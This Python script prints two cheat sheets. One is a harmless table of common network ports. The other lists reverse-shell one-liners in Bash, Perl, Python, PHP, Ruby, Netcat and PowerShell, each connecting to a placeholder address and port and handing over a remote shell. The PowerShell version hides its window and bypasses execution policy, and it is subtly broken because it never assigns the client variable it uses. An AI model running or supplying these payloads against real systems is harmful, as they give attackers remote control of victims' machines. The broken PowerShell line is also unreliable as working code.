

def print_common_ports():
    print("Common Ports and Protocols Cheat Sheet:\n")
    print("  Port(s)   Protocol                                       Description")
    print("  =======   ============================================   ===============================")
    print("  20, 21    FTP (File Transfer Protocol)                    Standard protocol for file transfers")
    print("  22        SSH (Secure Shell)                              Secure remote login")
    print("  23        Telnet                                          Unsecure remote login")
    print("  25        SMTP (Simple Mail Transfer Protocol)            Email transmission")
    print("  53        DNS (Domain Name System)                        Domain name resolution")
    print("  67, 68    DHCP (Dynamic Host Configuration Protocol)      Dynamic IP address allocation")
    print("  69        TFTP (Trivial File Transfer Protocol)           Simple file transfers")
    print("  80        HTTP (Hypertext Transfer Protocol)              Web traffic")
    print("  110       POP3 (Post Office Protocol 3)                   Email retrieval")
    print("  119       NNTP (Network News Transfer Protocol)           Usenet news")
    print("  123       NTP (Network Time Protocol)                     Time synchronization")
    print("  135       MSRPC (Microsoft Remote Procedure Call)         Windows RPC")
    print("  139       NetBIOS (NetBIOS Session Service)               Network communication")
    print("  143       IMAP (Internet Message Access Protocol)         Email retrieval")
    print("  161       SNMP (Simple Network Management Protocol)       Network management")
    print("  389       LDAP (Lightweight Directory Access Protocol)    Directory services")
    print("  443       HTTPS (HTTP Secure)                             Secure web traffic")
    print("  445       SMB (Server Message Block)                      Windows file sharing")
    print("  465       SMTPS (Simple Mail Transfer Protocol Secure)    Secure email transmission")
    print("  993       IMAPS (Internet Message Access Protocol Secure) Secure email retrieval")
    print("  995       POP3S (Post Office Protocol 3 Secure)           Secure email retrieval")
    print("  1433      MS SQL Server                                   Microsoft SQL database")
    print("  1521      Oracle Database                                 Oracle database")
    print("  3306      MySQL                                           MySQL database")
    print("  3389      RDP (Remote Desktop Protocol)                   Remote desktop access")
    print("  5432      PostgreSQL                                      PostgreSQL database")
    print("  5900      VNC (Virtual Network Computing)                 Remote desktop access")
    print("  6379      Redis                                           Redis database")
    print("  8080      HTTP Proxy                                      Alternate web traffic")
    print("  9200      Elasticsearch                                   Elasticsearch database")
    print("  11211     Memcached                                       Memory caching system")
    print("  27017     MongoDB                                         MongoDB database")
    print("  5000      Flask                                           Default Flask port")
    print("  8000      Django                                          Default Django port")
    print("")


def print_reverse_shells():
    print("Reverse Shell Techniques Cheat Sheet:\n")
    print("Bash:")
    print("  bash -i >& /dev/tcp/IP_ADDRESS/PORT 0>&1")
    print("Perl:")
    print("  perl -e 'use Socket;$i=\"IP_ADDRESS\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'")
    print("Python:")
    print("  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP_ADDRESS\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
    print("PHP:")
    print("  php -r '$sock=fsockopen(\"IP_ADDRESS\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
    print("Ruby:")
    print("  ruby -rsocket -e 'f=TCPSocket.open(\"IP_ADDRESS\",PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")
    print("Netcat:")
    print("  nc -e /bin/sh IP_ADDRESS PORT")
    print("  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP_ADDRESS PORT >/tmp/f")
    print("PowerShell:")
    print("  powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"IP_ADDRESS\",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()")
    print("")



